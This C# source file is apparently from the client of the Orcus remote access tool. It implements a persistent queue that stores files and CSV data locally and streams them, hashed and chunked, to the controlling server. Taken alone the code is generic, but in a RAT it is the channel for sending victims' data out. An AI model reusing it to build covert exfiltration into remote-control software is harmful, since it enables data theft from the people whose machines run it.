using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Csv;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.CommandManagement
{
    public class DatabaseConnection : IDatabaseConnection
    {
        private readonly object _executionLockObject = new object();
        private readonly List<FilePushRequest> _filePushRequests;
        private bool _isRunning;

        private ServerConnection _serverConnection;

        public DatabaseConnection()
        {
            _filePushRequests = new List<FilePushRequest>();
            Load();
        }

        public ServerConnection ServerConnection
        {
            get { return _serverConnection; }
            set
            {
                _serverConnection = value;
                if (value != null)
                    CheckRunning();
            }
        }

        public void PushFile(string fileName, string entryName, DataMode dataMode)
        {
            var file = GetFreePushFileName();
            File.Copy(fileName, file);
            InternalPushFile(file, entryName, dataMode, false);
        }

        public void PushFile(byte[] data, string entryName, DataMode dataMode)
        {
            var file = GetFreePushFileName();
            File.WriteAllBytes(file, data);
            InternalPushFile(file, entryName, dataMode, false);
        }

        public void PushData(CsvFile csvFile, string entryName, DataMode dataMode)
        {
            var file = GetFreePushFileName();
            using (var csvWriter = new CsvWriter())
                csvWriter.WriteCsv(csvFile, file, Encoding.UTF8);
            InternalPushFile(file, entryName, dataMode, true);
        }

        private void Load()
        {
            var directory = new DirectoryInfo(Consts.FileTransferTempDirectory);
            if (!directory.Exists)
                return;

            foreach (var infoFile in directory.GetFiles("*.nfo"))
            {
                try
                {
                    var pushInfo =
                        new JavaScriptSerializer().Deserialize<FilePushRequest>(
                            File.ReadAllText(infoFile.FullName));
                    if (!File.Exists(Path.Combine(directory.FullName, pushInfo.FileName)))
                    {
                        File.Delete(infoFile.FullName);
                        continue;
                    }

                    _filePushRequests.Add(pushInfo);
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }

        private void InternalPushFile(string fileName, string entryName, DataMode dataMode, bool isCsvData)
        {
            var pushRequest = new FilePushRequest
            {
                FileName = Path.GetFileName(fileName),
                DataMode = dataMode.Guid,
                EntryName = entryName,
                IsCsvData = isCsvData
            };
            File.WriteAllText(Path.Combine(Consts.FileTransferTempDirectory, pushRequest.FileName + ".nfo"),
                new JavaScriptSerializer().Serialize(pushRequest));
            _filePushRequests.Add(pushRequest);
            CheckRunning();
        }

        private void CheckRunning()
        {
            if (ServerConnection?.IsConnected != true)
                return;

            lock (_executionLockObject)
            {
                if (_isRunning)
                    return;
                _isRunning = true;
            }

            new Thread(() =>
            {
                try
                {
                    PushRequests();
                }
                catch (Exception)
                {
                    // ignored
                }
                finally
                {
                    lock (_executionLockObject)
                        _isRunning = false;
                }
            }).Start();
        }

        private void PushRequests()
        {
            var serverConnection = ServerConnection;
            while (serverConnection.IsConnected)
            {
                if (ServerConnection == null)
                    return;

                FilePushRequest currentEntry;
                lock (_executionLockObject)
                {
                    if (_filePushRequests.Count == 0)
                        return;
                    currentEntry = _filePushRequests[0];
                }

                var guid = Guid.NewGuid();
                using (var autoResetEvent = new AutoResetEvent(false))
                {
                    EventHandler<FileTransferEventArgs> handler = (s, e) =>
                    {
                        if (e.Guid == guid)
                            autoResetEvent.Set();
                    };
                    EventHandler disconnectedHandler = (sender, args) => autoResetEvent.Set();
                    serverConnection.FileTransferAccepted += handler;
                    serverConnection.Disconnected += disconnectedHandler;

                    serverConnection.InitializeFileTransfer(guid);

                    autoResetEvent.WaitOne();
                    serverConnection.Disconnected -= disconnectedHandler;
                    serverConnection.FileTransferAccepted -= handler;

                    if (!serverConnection.IsConnected)
                        return;

                    var file = new FileInfo(Path.Combine(Consts.FileTransferTempDirectory, currentEntry.FileName));
                    if (!file.Exists)
                    {
                        _filePushRequests.Remove(currentEntry);
                        continue;
                    }

                    var guidBytes = guid.ToByteArray();
                    using (var fileStream = new FileStream(file.FullName, FileMode.Open, FileAccess.Read))
                    {
                        byte[] fileHash;
                        using (var sha256 = new SHA256Managed())
                            fileHash = sha256.ComputeHash(fileStream);

                        fileStream.Position = 0;
                        var entryNameData = Encoding.UTF8.GetBytes(currentEntry.EntryName);
                        var headerPackage = new byte[16 + 8 + 32 + 16 + 1 + entryNameData.Length];
                        Array.Copy(guidBytes, 0, headerPackage, 0, 16);
                        Array.Copy(BitConverter.GetBytes(fileStream.Length), 0, headerPackage, 16, 8);
                        Array.Copy(fileHash, 0, headerPackage, 24, 32);
                        Array.Copy(currentEntry.DataMode.ToByteArray(), 0, headerPackage, 56, 16);
                        headerPackage[72] = (byte) (currentEntry.IsCsvData ? 0 : 1);
                        Array.Copy(entryNameData, 0, headerPackage, 73, entryNameData.Length);
                        serverConnection.SendBytes(FromClientPackage.PushHeader, headerPackage);

                        var buffer = new byte[4096];
                        int read;
                        while ((read = fileStream.Read(buffer, 0, 4096)) > 0)
                        {
                            lock (serverConnection.SendLock)
                            {
                                serverConnection.BinaryWriter.Write((byte) FromClientPackage.PushFileData);
                                serverConnection.BinaryWriter.Write(read + 16);
                                serverConnection.BinaryWriter.Write(guidBytes);
                                serverConnection.BinaryWriter.Write(buffer, 0, read);
                                serverConnection.BinaryWriter.Flush();
                            }
                        }
                    }

                    autoResetEvent.Reset();
                    EventHandler<FileTransferEventArgs> completedHandler = (sender, args) =>
                    {
                        if (args.Guid == guid)
                            autoResetEvent.Set();
                    };
                    serverConnection.FileTransferCompleted += completedHandler;
                    if (!autoResetEvent.WaitOne(30000))
                        continue;

                    File.Delete(file.FullName);
                    File.Delete(file.FullName + ".nfo");
                    _filePushRequests.Remove(currentEntry);
                }
            }
        }

        private string GetFreePushFileName()
        {
            if (!Directory.Exists(Consts.FileTransferTempDirectory))
                Directory.CreateDirectory(Consts.FileTransferTempDirectory);

            return FileExtensions.GetUniqueFileName(Consts.FileTransferTempDirectory);
        }
    }

    public class FilePushRequest
    {
        public string EntryName { get; set; }
        public Guid DataMode { get; set; }
        public string FileName { get; set; }
        public bool IsCsvData { get; set; }
    }
}